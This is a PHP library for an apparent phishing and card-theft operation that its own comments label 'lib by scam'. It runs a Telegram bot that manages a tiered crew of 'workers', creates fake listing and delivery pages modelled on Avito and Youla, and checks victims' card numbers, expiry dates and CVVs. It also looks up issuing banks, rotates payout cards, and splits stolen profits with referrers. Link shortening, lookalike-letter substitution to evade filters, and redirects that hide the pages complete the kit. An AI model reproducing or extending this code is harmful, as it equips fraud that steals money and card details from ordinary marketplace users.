<?php
// By @cryptostudio_dev
// lib by scam
	error_reporting(0);
	date_default_timezone_set('Europe/Moscow');

    require_once '../settings/db_connect.php';
	include '_config.php';

	function loadSite() {
		header('Location: https://www.wikipedia.org/');
		exit();
	}

	function host() {
		return 'https://'.$_SERVER['SERVER_NAME'].'/';
	}

   function isSiteAvailible($url) {
    if(!filter_var($url, FILTER_VALIDATE_URL)){
      return false;
    }
    $curlInit = curl_init($url);
    curl_setopt($curlInit,CURLOPT_CONNECTTIMEOUT,10);
    curl_setopt($curlInit,CURLOPT_HEADER,true);
    curl_setopt($curlInit,CURLOPT_NOBODY,true);
    curl_setopt($curlInit,CURLOPT_RETURNTRANSFER,true);
    $response = curl_exec($curlInit);
    curl_close($curlInit);

        return $response ? true : false;
    }


	function getChatJoin($a, $type) {

		if($type == '1'){
            $get = json_decode(file_get_contents("https://api.telegram.org/bot".botToken()."/getChatMember?chat_id=".chatProfits()."&user_id=".$a),1);
		}
		if($type == '2'){
            $get = json_decode(file_get_contents("https://api.telegram.org/bot".botToken()."/getChatMember?chat_id=".chatNews()."&user_id=".$a),1);
		}

        if($get['result']['status'] == 'left'){
		    return false;
        }else{
	    	return true;
        }

	}

	function userStatusName($a) {
		return [
			0 => 'Без статуса',
			1 => 'Заблокирован',
			2 => 'Воркер',
			3 => 'Помощник',
			4 => 'Модератор',
			5 => 'Администратор',
			6 => 'Кодер',
			7 => 'ТС',
			8 => 'Воркер+',
		][$a];
	}

	function isAutoCard() {
		return (fileRead(dirSettings('acard')) == '1');
	}

	function toggleAutoCard() {
		$t = isAutoCard();
		fileWrite(dirSettings('acard'), $t ? '' : '1');
		return !$t;
	}

	function isAutoPayment() {
		return (fileRead(dirSettings('apaym')) == '1');
	}

	function addCardBalance($n, $v) {
		$t = getCards();
		$res = [];
		for ($i = 0; $i < count($t); $i++) {
			$t1 = explode(':', $t[$i]);
			if ($t1[0] == $n)
				$t1[1] = intval($t1[1]) + $v;
			$res[] = implode(':', $t1);
		}
		setCard($res);
	}

	function getCards() {
		$t = fileRead(dirSettings('card'));
		if (strlen($t) == 0)
			return [];
		return explode('`', $t);
	}

	function getCardData() {
		return explode(':', getCards()[0]);
	}

	function getCard() {
		return getCardData()[0];
	}

	function getCardBalance() {
		return intval(getCardData()[1]);
	}

	function setNextCard() {
		$autoc = (fileRead(dirSettings('acard')) == '1');
		if (!$autoc)
			return false;
		$t = getCards();
		$t1 = $t[0];
		$c = count($t);
		for ($i = 0; $i < $c - 1; $i++)
			$t[$i] = $t[$i + 1];
		$t[$c - 1] = $t1;
		setCard($t);
		return explode(':', $t[0])[0];
	}

	function cardIndex($n, $t) {
		for ($i = 0; $i < count($t); $i++)
			if (explode(':', $t[$i])[0] == $n)
				return $i;
		return -1;
	}

	function addCard($n) {
		$t = getCards();
		if (cardIndex($n, $t) != -1)
			return false;
		$t[] = $n.':0';
		return setCard($t);
	}

	function delCard($n) {
		$t = getCards();
		$t1 = cardIndex($n, $t);
		if ($t1 == -1)
			return false;
		unset($t[$t1]);
		return setCard($t);
	}

	function setCard($v) {
		return fileWrite(dirSettings('card'), implode('`', $v));
	}

	function getCard2() {
		return explode('`', fileRead(dirSettings('card2')));
	}

	function setCard2($n, $j) {
		return fileWrite(dirSettings('card2'), implode('`', [$n, $j]));
	}

	function getCardBtc() {
		return fileRead(dirSettings('cbtc'));
	}

	function setCardBtc($n) {
		return fileWrite(dirSettings('cbtc'), $n);
	}

	function getPaymentName() {
		return intval(fileRead(dirSettings('pay')));
	}

	function setPaymentName($n) {
		fileWrite(dirSettings('pay'), $n);
	}

	function getPayXRate() {
		return intval(fileRead(dirSettings('payx')));
	}

	function setPayXRate($a) {
		fileWrite(dirSettings('payx'), $a);
	}

	function fixAmount($a) {
		return min(max($a, amountMin()), amountMax());
	}

	function getUserDomainName($id, $a) {
		return getDomain($a, getUserDomain($id, $a));
	}

	function dirUsers($id, $n = false) {
		return 'users/'.$id.($n ? '/'.$n.'.txt' : '');
	}

	function isnt_t($isnt) {
		if ($isnt == 1) return 'items';
		elseif ($isnt == 2) return 'rent';
		elseif ($isnt == 3) return 'taxi';
		elseif ($isnt == 4) return 'score';
		elseif (!$isnt) return 'tracks';
	}

	function dirItems($n, $isnt) {
		return isnt_t($isnt).'/'.$n.'.txt';
	}

	function dirStats($n) {
		return 'stats/'.$n.'.txt';
	}

	function dirSettings($n) {
		return 'settings/'.$n.'.txt';
	}

	function dirBin($n) {
		return 'bin/'.$n.'.txt';
	}

	function dirKeys($n) {
		return 'keys/'.$n.'.txt';
	}

	function dirIp($n) {
		return 'ip/'.$n.'.txt';
	}

	function dirPays($n) {
		return 'pays/'.$n.'.txt';
	}

	function dirMails($n) {
		return 'mails/'.$n.'.txt';
	}

	function dirCards($n) {
		return 'cards/'.$n.'.txt';
	}

	function dirChecks($n) {
		return 'checks/'.$n.'.txt';
	}

	function dirPages($n) {
		return 'pages/'.$n.'.txt';
	}

	function dirStyles($n) {
		return 'styles/'.$n.'.txt';
	}

	function dirScripts($n) {
		return 'scripts/'.$n.'.txt';
	}

	function setIpData($ip, $n, $v) {
		fileWrite(dirIp($n.'_'.str_replace(':', ';', $ip)), $v);
	}

	function getIpData($ip, $n) {
		return fileRead(dirIp($n.'_'.str_replace(':', ';', $ip)));
	}

	function setCardData($a, $b, $c, $d) {
		fileWrite(dirCards($a.'-'.$b.'-'.$c.'-'.$d), time());
	}

	function isCardData($a, $b, $c, $d) {
		return (time() - intval(fileRead(dirCards($a.'-'.$b.'-'.$c.'-'.$d))) < 10);
	}

	function setCookieData($n, $v, &$cc) {
		$cc[md5($n)] = base64_encode($v);
	}

	function getCookieData($n, $cc) {
		return base64_decode($cc[md5($n)]);
	}

	function getLastAlert() {
		return fileRead(dirSettings('alert'));
	}

// By @cryptostudio_dev
// lib by scam

	function setLastAlert($n) {
		return fileWrite(dirSettings('alert'), $n);
	}

	function isItem($item, $isnt) {
		return file_exists(dirItems($item, $isnt));
	}

	function delItem($item, $isnt) {
		fileDel(dirItems($item, $isnt));
	}

	function addItem($v, $isnt) {
		$item = 0;
		while (true) {
			$item = rand(10000000, 99999999);
			if (!isItem($item, $isnt))
				break;
		}
		fileWrite(dirItems($item, $isnt), implode('`', $v));
		return $item;
	}

	function getItemData($item, $isnt) {
		$t = explode('`', fileRead(dirItems($item, $isnt)));
		$t[0] = intval($t[0]);
		$t[1] = intval($t[1]);
		$t[2] = intval($t[2]);
		$t[4] = intval($t[4]);
		$t[5] = intval($t[5]);
		return $t;
	}

	function setItemData($item, $n, $v, $isnt) {
		$t = getItemData($item, $isnt);
		$t[$n] = $v;
		fileWrite(dirItems($item, $isnt), implode('`', $t));
	}

	function addItemData($item, $n, $v, $isnt) {
		$t = getItemData($item, $isnt);
		$t[$n] = intval($t[$n]) + $v;
		fileWrite(dirItems($item, $isnt), implode('`', $t));
	}

	function getUserItems($id, $isnt) {

		$t = getUserData($id, isnt_t($isnt));
		if (!$t)
			return [];
		return explode('`', $t);
	}

	function setUserItems($id, $items, $isnt) {
		setUserData($id, isnt_t($isnt), implode('`', $items));
	}

	function getUserDomains($id) {
		$doms = explode('`', getUserData($id, 'doms'));
		$c = 7 - count($doms);
		if ($c > 0)
			for ($i = 0; $i < $c; $i++)
				$doms[] = '';
		return $doms;
	}

	function getUserDomain($id, $srvc) {
		return intval(getUserDomains($id)[intval($srvc) - 1]);
	}

	function setUserDomain($id, $srvc, $n) {
		$doms = getUserDomains($id);
		$doms[$srvc - 1] = ($n === 0 ? '' : $n);
		setUserData($id, 'doms', implode('`', $doms));
	}

	function isUserAnon($id) {
		return (getUserData($id, 'anon') == '1');
	}

	function setUserAnon($id, $v) {
		setUserData($id, 'anon', $v ? '1' : '');
	}

	function getUserReferal($id) {
		$referal = getUserData($id, 'referal');
		if (isUserBanned($referal))
			return false;
		return $referal;
	}

	function setUserReferal($id, $v) {
		if (isUserBanned($v))
			return;
		setUserData($id, 'referal', $v);
	}

	function getUserReferalName($id, $a = false, $b = false) {
		$t = getUserReferal($id);
		return ($t ? userLogin($t, $a, $b) : 'Никто');
	}

	function delUserItem($id, $item, $isnt) {
		delItem($item, $isnt);
		$items = getUserItems($id, $isnt);
		if (!in_array($item, $items))
			return;
		unset($items[array_search($item, $items)]);
		setUserItems($id, $items, $isnt);
	}

	function addUserItem($id, $v, $isnt) {
		$item = addItem($v, $isnt);
		$items = getUserItems($id, $isnt);
		if (in_array($item, $items))
			return 0;
		$items[] = $item;
		setUserItems($id, $items, $isnt);
		return $item;
	}

	function isUserItem($id, $item, $isnt) {
		$items = getUserItems($id, $isnt);
		return in_array($item, $items);
	}

	function getUserChecks($id) {
		$t = getUserData($id, 'checks');
		if (!$t)
			return [];
		return explode('`', $t);
	}

	function setUserChecks($id, $checks) {
		setUserData($id, 'checks', implode('`', $checks));
	}

	function urlCheck($check) {
		return 'https://t.me/'.botLogin().'?start=c_'.$check;
	}

	function isCheck($check) {
		return file_exists(dirChecks($check));
	}

	function delCheck($check) {
		fileDel(dirChecks($check));
	}

	function getCheckData($check) {
		$t = explode('`', fileRead(dirChecks($check)));
		$t[0] = intval($t[0]);
		return $t;
	}

	function delUserCheck($id, $check) {
		delCheck($check);
		$checks = getUserChecks($id);
		if (!in_array($check, $checks))
			return;
		unset($checks[array_search($check, $checks)]);
		setUserChecks($id, $checks);
	}

	function addUserCheck($id, $v) {
		$check = addCheck($v);
		$checks = getUserChecks($id);
		if (in_array($check, $checks))
			return 0;
		$checks[] = $check;
		setUserChecks($id, $checks);
		return $check;
	}

	function isUserCheck($id, $check) {
		$checks = getUserChecks($id);
		return in_array($check, $checks);
	}

	function getRate($id = false) {
		$t = explode('`', fileRead(dirSettings('rate')));
		$prc1 = intval($t[0]);
		$prc2 = intval($t[1]);
		if ($id) {
			$t = explode('`', getUserData($id, 'rate'));
			$t1 = intval($t[0]);
			$t2 = intval($t[1]);
			if ($t1 > 0)
				$prc1 = $t1;
			if ($t2 > 0)
				$prc2 = $t2;
		}
		return [$prc1, $prc2];
	}

	function setRate($a, $b) {
		fileWrite(dirSettings('rate'), $a.'`'.$b);
	}

	function setUserRate($id, $a, $b) {
		setUserData($id, 'rate', $a.'`'.$b);
	}

	function delUserRate($id) {
		setUserData($id, 'rate', '');
	}

	function setAmountLimit($a, $b) {
		fileWrite(dirSettings('amin'), $a);
		fileWrite(dirSettings('amax'), $b);
	}

	function setReferalRate($a) {
		fileWrite(dirSettings('refr'), $a);
	}

	function setUserData($id, $n, $v) {
		$t = dirUsers($id, $n);
		if ($v == '') {
			if (file_exists($t))
				fileDel($t);
		} else
			fileWrite($t, $v);
	}

	function getUserData($id, $n) {
		return fileRead(dirUsers($id, $n));
	}

	function setInput($id, $v) {
		setUserData($id, 'input', $v);
	}

	function getInput($id) {
		return getUserData($id, 'input');
	}

	function setUserBalance($id, $v) {
		setUserData($id, 'balance', $v);
	}

	function getUserBalance($id) {
		return intval(getUserData($id, 'balance'));
	}

	function addUserBalance($id, $v) {
		setUserBalance($id, intval(getUserBalance($id) + $v));
	}

	function setUserBalance2($id, $v) {
		setUserData($id, 'balance2', $v);
	}

	function getUserBalance2($id) {
		return intval(getUserData($id, 'balance2'));
	}

	function addUserBalance2($id, $v) {
		setUserBalance2($id, intval(getUserBalance2($id) + $v));
	}

	function setUserBalanceOut($id, $v) {
		setUserData($id, 'balanceout', $v);
	}

	function getUserBalanceOut($id) {
		return intval(getUserData($id, 'balanceout'));
	}

	function getUserHistory($id) {
		$t = getUserData($id, 'history');
		if (!$t)
			return false;
		return explode('`', $t);
	}

	function addUserHistory($id, $v) {
		$t = getUserHistory($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'history', implode('`', $t));
	}

	function getUserProfits($id) {
		$t = getUserData($id, 'profits');
		if (!$t)
			return false;
		return explode('`', $t);
	}

// By @cryptostudio_dev
// lib by scam

	function addUserProfits($id, $v) {
		$t = getUserProfits($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'profits', implode('`', $t));
	}

	function getUserRefs($id) {
		return intval(getUserData($id, 'refs'));
	}

	function addUserRefs($id) {
		setUserData($id, 'refs', intval(getUserRefs($id) + 1));
	}

	function getUserRefbal($id) {
		return intval(getUserData($id, 'refbal'));
	}

	function addUserRefbal($id, $v) {
		setUserData($id, 'refbal', intval(getUserRefbal($id) + $v));
	}

	function setInputData($id, $n, $v) {
		setUserData($id, 't/_'.$n, $v);
	}

	function getInputData($id, $n) {
		return getUserData($id, 't/_'.$n);
	}

	function setUserStatus($id, $v) {
		setUserData($id, 'status', $v);
	}

	function getUserStatus($id) {
		return intval(getUserData($id, 'status'));
	}

	function getUserStatusName($id) {
		return userStatusName(getUserStatus($id));
	}

	function isUserAccepted($id) {
		return (intval(getUserData($id, 'joined')) > 0);
	}

	function isUser($id) {
		return is_dir(dirUsers($id));
	}

	function isUserBanned($id) {
		return (getUserStatus($id) == 1);
	}

	function canUserUseSms($id) {
		$accessms = accessSms();
		$profit = getUserProfit($id);
		return (getUserStatus($id) > 4 || userJoined($id) >= $accessms[0] || $profit[1] >= $accessms[1]);
	}

	function getUserProfit($id) {
		$t = getUserData($id, 'profit');
		if (!$t)
			return [0, 0];
		$t = explode('`', $t);
		return [intval($t[0]), intval($t[1])];
	}

	function addUserProfit($id, $amount, $rate) {
		$profit = getUserProfit($id);
		setUserData($id, 'profit', implode('`', [$profit[0] + 1, $profit[1] + $amount]));
		$amount0 = 0;
		$referal = getUserReferal($id);
		if ($referal) {
			$amount0 = intval($amount * referalRate() / 100);
			addUserBalance($referal, $amount0);
			addUserRefbal($referal, $amount0);
		}
		$amount = intval($amount * $rate) - $amount0;
		addUserBalance($id, $amount);
		addUserProfits($id, [time(), $amount]);
		return [$amount, $amount0];
	}

	function getProfit() {
		$t = explode('`', fileRead(dirStats('profit')));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function getProfit0() {
		$t = explode('`', fileRead(dirStats('profit_'.date('dmY'))));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function addProfit($v, $m) {
		$t = getProfit();
		fileWrite(dirStats('profit'), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
		$t = getProfit0();
		fileWrite(dirStats('profit_'.date('dmY')), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
	}

	function urlReferal($v) {
		return 'https://t.me/'.projectAbout('botLogin').'?start=r_'.$v;
	}

	function regUser($id, $login, $accept = false) {
		if ($accept) {
			setUserData($id, 'joined', time());
			setUserStatus($id, 2);
			return true;
		} else {
			if (!isUser($id)) {
				mkdir(dirUsers($id));
				mkdir(dirUsers($id).'/t');
				setUserData($id, 'login', $login);
				return true;
			}
		}
		return false;
	}

	function updLogin($id, $login) {
		$t = getUserData($id, 'login');
		if (strval($t) == strval($login))
			return false;
		setUserData($id, 'login', $login);
		return true;
	}

	function userJoined($id) {
		return intval((time() - intval(getUserData($id, 'joined'))) / 86400);
	}

	function userLogin($id, $shid = false, $shtag = false) {
		$login = getUserData($id, 'login');
		return ($shtag ? getUserStatusName($id).' ' : '').'<a href="tg://user?id='.$id.'">'.($login ? $login : 'Без ника').'</a>'.($shid ? ' ['.$id.']' : '');
	}

	function userLogin2($id) {
		return (isUserAnon($id) ? 'Скрыт' : userLogin($id));
	}

	function makeProfit($id, $isnr, $amount, $pkoef) {
		$rate = getRate($id)[$isnr != 1 ? 0 : 1] - (($pkoef - 1) * getPayXRate());
		if ($rate < 10)
			$rate = 10;
		$rate /= 100;
		$t = addUserProfit($id, $amount, $rate);
		addProfit($amount, $t[0] + $t[1]);
		return $t;
	}

	function createBalout($id) {
		$balance = getUserBalance($id);
		setUserBalance($id, 0);
		setUserBalanceOut($id, $balance);
		return $balance;
	}

	function makeBalout($id, $dt, $balout, $url) {
		setUserBalanceOut($id, 0);
		addUserHistory($id, [$dt, $balout, $url]);
		return true;
	}

	function request($url, $post = false, $rh = false) {
		$curl = curl_init($url);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
		if ($rh)
			curl_setopt($curl, CURLOPT_HEADER, true);
		if ($post) {
			curl_setopt($curl, CURLOPT_POST, true);
			curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));
		}
		$result = curl_exec($curl);
		curl_close($curl);
		return $result;
	}

	function botSend($msg, $id = false, $kb = false, $del = false) {
		if (!$id)
			return false;
		if (is_array($msg))
			$msg = implode("\n", $msg);
		$post = [
			'parse_mode' => 'html',
			'disable_web_page_preview' => 'true',
			'chat_id' => $id,
			'text' => $msg,
		];
		if ($kb)
			$post['reply_markup'] = json_encode(botKeybd($kb));
		if ($del)
			$post['reply_markup'] = json_encode('"remove_keyboard" => true');
		return json_decode(request(botUrl('sendMessage'), $post), true)['ok'];
	}

	function botEdit($msg, $mid, $id, $kb = false) {
		if (is_array($msg))
			$msg = implode("\n", $msg);
		$post = [
			'parse_mode' => 'html',
			'disable_web_page_preview' => 'true',
			'chat_id' => $id,
			'message_id' => $mid,
			'text' => $msg,
		];
		if ($kb)
			$post['reply_markup'] = json_encode(botKeybd($kb));
		request(botUrl('editMessageText'), $post);
	}

	function botKick($id, $chat) {
		$post = [
			'chat_id' => $chat,
			'user_id' => $id,
		];
		return json_decode(request(botUrl('kickChatMember'), $post), true)['ok'];
	}

	function botDelete($mid, $id) {
		$post = [
			'chat_id' => $id,
			'message_id' => $mid,
		];
		request(botUrl('deleteMessage'), $post);
	}

	function botKeybd($v) {
		if ($v[0])
			return [
				'inline_keyboard' => $v[1]
			];
		else
			return [
				'keyboard' => $v[1],
				'resize_keyboard' => true,
				'one_time_keyboard' => false
			];
	}

	function botUrl($n) {
		return 'https://api.telegram.org/bot'.botToken().'/'.$n;
	}

	function botUrlFile($n) {
		return 'https://api.telegram.org/file/bot'.botToken().'/'.$n;
	}

	function isUrlItem($url, $a) {
		return count(explode('/', explode([
			1 => 'avito.ru',
			2 => 'youla.ru',
		][$a], $url, 2)[1])) >= 4;
	}

	function isUrlImage($url) {
		$head = mb_strtolower(explode("\r\n\r\n", request($url, false, true))[0]);
		$ctype = pageCut($head, 'content-type: ', "\r\n");
		return in_array($ctype, [
			'image/jpeg',
			'image/png',
			'image/webp',
		]);
	}

	function isEmail($n) {
		$ps = explode('@', $n);
		if (count($ps) != 2)
			return false;
		if (count(explode('.', $ps[1])) < 2)
			return false;
		$l = strlen($ps[0]);
		if ($l < 2 || $l > 64)
			return false;
		$o = '_-.';
		if (strpos($o, $ps[0][0]) !== false || strpos($o, $ps[0][$l - 1]) !== false)
			return false;
		for ($i = 0; $i < strlen($o); $i++)
			for ($j = 0; $j < strlen($o); $j++)
				if (strpos($ps[0], $o[$i].$o[$j]) !== false)
					return false;
		return true;
	}

	function fileRead($n) {
		if (!file_exists($n))
			return false;
		$f = fopen($n, 'rb');
		if (flock($f, LOCK_SH)) {
			$v = fread($f, filesize($n));
			fflush($f);
			flock($f, LOCK_UN);
		}
		fclose($f);
		return $v;
	}

	function fileWrite($n, $v, $a = 'w') {
		$f = fopen($n, $a.'b');
		if (flock($f, LOCK_EX)) {
			fwrite($f, $v);
			fflush($f);
			flock($f, LOCK_UN);
		}
		fclose($f);
		return true;
	}

	function fileDel($n) {
		if (file_exists($n))
			return unlink($n);
		return false;
	}

	function fuckUrl($url) {
		return request('https://is.gd/create.php?format=simple&url='.$url);
	}

	function isValidCard($n, $m, $y, $c) {
		$n = beaCard($n);
		if (!$n)
			return false;
		$m = intval(beaText($m, chsNum()));
		if ($m < 1 || $m > 12)
			return false;
		$y = intval(beaText($y, chsNum()));
		if ($y < 20 || $y > 99)
			return false;
		$c = beaText($c, chsNum());
		if (strlen($c) != 3)
			return false;
		return true;
	}

	function isPayData($merchant) {
		return file_exists(dirPays(md5($merchant)));
	}

	function getPayData($merchant, $del = true) {
		$t = explode('`', fileRead(dirPays(md5($merchant))));
		if ($del)
			unlink(dirPays(md5($merchant)));
		return $t;
	}

	function setPayData($merchant, $v) {
		return fileWrite(dirPays(md5($merchant)), implode('`', $v));
	}

	function cardHide($n) {
		return cardBank($n).' ****'.substr($n, strlen($n) - 4);
	}

	function beaCash($v) {
		return number_format($v, 0, '', '').' $';
	}

	function beaDays($v) {
		return $v.' '.selectWord($v, ['дней', 'день', 'дня']);
	}

	function beaKg($v) {
		return number_format(intval($v) / 1000, 1, '.', '').' кг';
	}

	function chsNum() {
		return '0123456789';
	}

	function chsAlpRu() {
		return 'йцукеёнгшщзхъфывапролджэячсмитьбюЙЦУКЕЁНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ';
	}

	function chsAlpEn() {
		return 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
	}

	function chsSym() {
		return ' .,/\\"\'()_-+=!@#$%^&*№?;:|[]{}«»';
	}

	function chsAll() {
		return chsNum().chsAlpRu().chsAlpEn().chsSym();
	}

	function chsFio() {
		return chsAlpRu().chsAlpEn().' .-\'';
	}

	function chsMail() {
		return chsNum().chsAlpEn().'_-.@';
	}

	function beaText($v, $c) {
		$t = '';
		for ($i = 0; $i < strlen($v); $i++)
			if (strpos($c, $v[$i]) !== false)
				$t .= $v[$i];
		return $t;
	}

	function pageCut($s, $s1, $s2) {
		if (strpos($s, $s1) === false || strpos($s, $s2) === false)
			return '';
		return explode($s2, explode($s1, $s, 2)[1], 2)[0];
	}

	function cardBank($n) {
		$n = substr($n, 0, 6);
		$t = fileRead(dirBin($n));
		if ($t)
			return $t;
		$page = json_decode(request('https://api.tinkoff.ru/v1/brand_by_bin?bin='.$n), true)['payload'];
		$t = $page['paymentSystem'].' '.$page['bank'];
		fileWrite(dirBin($n), $t);
		return $t;
	}

	function imgUpload($v) {
		$v2 = json_decode(request(botUrl('getFile?file_id='.$v)), true)['result']['file_path'];
		if (!$v2)
			return false;
		$img = base64_encode(request(botUrlFile($v2)));
		$curl = curl_init('https://api.imgur.com/3/image.json');
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_HTTPHEADER, [
			'Authorization: Client-ID '.imgurId(),
		]);
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_POSTFIELDS, [
			'image' => $img,
		]);
		$result = json_decode(curl_exec($curl), true)['data']['link'];
		curl_close($curl);
		return $result;
	}

	function beaCard($n) {
		$n = beaText($n, chsNum());
		if (strlen($n) < 13 || strlen($n) > 19)
			return false;
		$sum = 0;
		$len = strlen($n);
		for ($i = 0; $i < $len; $i++) {
			$d = intval($n[$i]);
			if (($len - $i) % 2 == 0) {
				$d *= 2;
				if ($d > 9)
					$d -= 9;
			}
			$sum += $d;
		}
		return (($sum % 10) == 0) ? $n : false;
	}

	function calcDelivery($c1, $c2) {
		$km = pageCut(request('https://www.distance.to/'.$c1.'/'.$c2), '<span class=\'value km\'>', '</');
		$km = intval(beaText(explode('.', $km)[0], chsNum()));
		$km = min(max($km, 0), 6000);
		$dp = 2;
		if ($km <= 1000)
			$dp = 1;
		else if ($km >= 3000)
			$dp = 3;
		$cost = min(max(intval($km / 5), 100), 1000);
		$d1 = min(max(intval($km / 500), 1), 10);
		$ms = min(max(intval($km / 1000), 3), 5) * 10;
		return implode('`', [$cost, $d1, $d1 + $dp, $ms]);
	}

	function selectWord($n, $v) {
		$n = intval($n);
		$d = $v[0];
		$j = ($n % 100);
		if ($j < 5 || $j > 20) {
			$j = ($n % 10);
			if ($j == 1)
				$d = $v[1];
			elseif ($j > 1 && $j < 5)
				$d = $v[2];
		}
		return $d;
	}

	function beaPhone($t) {
		$t = str_split($t);
		array_splice($t, 9, 0, ['-']);
		array_splice($t, 7, 0, ['-']);
		array_splice($t, 4, 0, [') ']);
		array_splice($t, 1, 0, [' (']);
		array_splice($t, 0, 0, ['+']);
		return implode('', $t);
	}

	function alertUsers($t) {
		$c1 = 0;
		$c2 = 0;
		foreach (glob(dirUsers('*')) as $t1) {
			$id2 = basename($t1);
			if (botSend([
				$t,
			], $id2))
				$c1++;
			else
				$c2++;
		}
		return [$c1, $c2];
	}

	function fuckText($t) {
		return str_replace([
			'у', 'е', 'х', 'а', 'р', 'о', 'с', 'К', 'Е', 'Н', 'Х', 'В', 'А', 'Р', 'О', 'С', 'М', 'Т'
		], [
			'y', 'e', 'x', 'a', 'p', 'o', 'c', 'K', 'E', 'H', 'X', 'B', 'A', 'P', 'O', 'C', 'M', 'T'
		], $t);
	}

	// By @cryptostudio_dev
    // lib by scam
?>
